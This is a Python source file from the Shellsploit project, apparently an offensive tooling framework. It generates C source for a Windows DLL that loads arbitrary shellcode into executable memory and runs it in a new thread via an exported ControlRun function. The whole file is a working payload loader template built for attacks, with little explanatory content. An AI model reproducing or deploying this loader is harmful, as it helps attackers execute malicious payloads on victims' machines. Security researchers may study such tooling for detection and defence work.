#------------------Bombermans Team---------------------------------#
#Author  : B3mB4m
#Concat  : b3mb4m@protonmail.com
#Project : https://github.com/b3mb4m/Shellsploit
#LICENSE : https://github.com/b3mb4m/Shellsploit/blob/master/LICENSE
#------------------------------------------------------------------#

from header import *

DLL_TEMPLATE = """/**
 * C source to generate a DLL using shellsploit.
 * %s - %s
 *
 * To compile using CL:
 * C:> cl.exe MyFile.c /DLL /OUT:MyDll.dll /LD
 *
 * Ref:
 * - https://gist.github.com/hugsy/e5c4ce99cd7821744f95
 * - https://gist.github.com/hugsy/9797644
 * @_hugsy_
 *
 */

#include <windows.h>
#include <shellapi.h>
#include <tchar.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>

unsigned char shellcode[] = "%s";

DWORD WINAPI SpawnShellcode(LPVOID lpSc)
{
    __asm  mov eax, [lpSc]
    __asm  call eax
    return 0;
}

void __declspec(dllexport) ControlRun(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    LPVOID code = NULL;
    DWORD  dwBytesToRead = sizeof(shellcode);
    int pID;

    code = VirtualAlloc(NULL, dwBytesToRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!code) {
		return;
    }

    memset(code, 0, dwBytesToRead);
    memcpy(code, shellcode, dwBytesToRead);
    WaitForSingleObject(CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID), INFINITE);
    VirtualFree(code, dwBytesToRead, MEM_RELEASE);

    return;
}
"""

def DllFile(shellcode):
	db =  DLL_TEMPLATE % (time.strftime("%d/%m/%Y"), time.strftime("%H:%M:%S"), shellcode)
	logs( db, "c")
        
